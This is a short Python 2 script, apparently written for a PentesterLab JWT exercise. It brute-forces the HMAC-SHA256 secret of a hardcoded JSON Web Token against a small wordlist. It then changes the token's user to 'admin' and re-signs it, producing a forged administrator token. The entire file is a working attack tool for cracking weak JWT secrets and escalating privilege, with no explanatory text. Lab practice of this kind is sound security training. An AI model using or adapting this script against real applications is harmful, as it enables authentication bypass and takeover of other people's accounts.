#!/usr/bin/env python

import base64
import json
import sys
import hmac
import hashlib

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

if jwt.count(".") != 2:
  sys.exit("Error: JWT must have exactly 2 dots")


header_encoded, payload_encoded, signature_encoded = jwt.split(".")

header = base64.urlsafe_b64decode(header_encoded + "===")
payload = base64.urlsafe_b64decode(payload_encoded + "===")
signature = base64.urlsafe_b64decode(signature_encoded + "===")

header_dict = json.loads(header)

if not header_dict.has_key("alg"):
  sys.exit("Error: Header is missing an alg value")


if header_dict["alg"] != "HS256":
  sys.exit("Error: Header has an alg value other than HS256")


keys = ["hacker", "jwt", "insecurity", "pentesterlab", "hacking"]

for key in keys:
  print "Trying " + key
  guess_signature = hmac.new(key, msg=header_encoded + "." + payload_encoded, digestmod=hashlib.sha256).digest()
  guess_signature_encoded = base64.urlsafe_b64encode(guess_signature).split("=")[0]

  if guess_signature == signature:
    print "  Signature matches!"

  if guess_signature_encoded == signature_encoded:
    print "  Encoded signature matches!"



print "-- Finished bruteforce --"


payload_dict = json.loads(payload)

if not payload_dict.has_key("user"):
  sys.exit("Error: Payload is missing a user value")


payload_dict["user"] = "admin"
payload_modified = json.dumps(payload_dict)
payload_modified_encoded = base64.urlsafe_b64encode(payload_modified).split("=")[0]


signature_modified = hmac.new("pentesterlab", msg=header_encoded + "." + payload_modified_encoded, digestmod=hashlib.sha256).digest()
signature_modified_encoded = base64.urlsafe_b64encode(signature_modified).split("=")[0]

print header_encoded + "." + payload_modified_encoded + "." + signature_modified_encoded
